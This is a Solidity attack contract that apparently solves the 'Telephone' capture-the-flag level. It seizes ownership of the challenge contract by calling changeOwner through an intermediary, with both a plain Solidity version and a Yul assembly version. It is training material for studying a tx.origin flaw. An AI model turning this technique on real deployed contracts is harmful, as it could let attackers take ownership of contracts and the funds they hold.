// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address) external;
}

contract TelephoneHack {
    Telephone telephone;

    constructor(address chal) {
        telephone = Telephone(chal);
    }

    function SolidityBuild(address _player) public {
        telephone.changeOwner(_player);
    }

    function YulBuild(address _player) public {
        assembly {
            mstore(0, "changeOwner(address)")
            mstore(0, keccak256(0, 20))
            mstore(4, _player)

            let success := call(gas(), sload(0), 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
